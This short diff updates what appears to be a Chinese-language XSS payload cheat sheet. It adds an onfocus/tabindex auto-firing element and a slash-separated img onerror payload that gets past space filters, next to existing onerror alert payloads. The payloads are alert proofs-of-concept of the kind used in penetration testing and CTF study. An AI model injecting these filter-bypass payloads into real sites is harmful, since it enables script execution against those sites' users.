@@ -8,6 +8,7 @@
 <img src="1" onerror="">
 <img src="1" onerror="alert(1)"> 
 <img src=x onerror=alert(233)>
+<aaaa id="c" onfocus="alert(1)" tabindex=0>
 
 
 
@@ -65,6 +66,7 @@ hackbar工具混淆：
 空格输入被过滤:
 ```
 用%0d(回车) %0a(换行) %0c  /  /**/代替
+<img/src/onerror=alert(1)>1
 ```
 
 括号()输入被过滤:
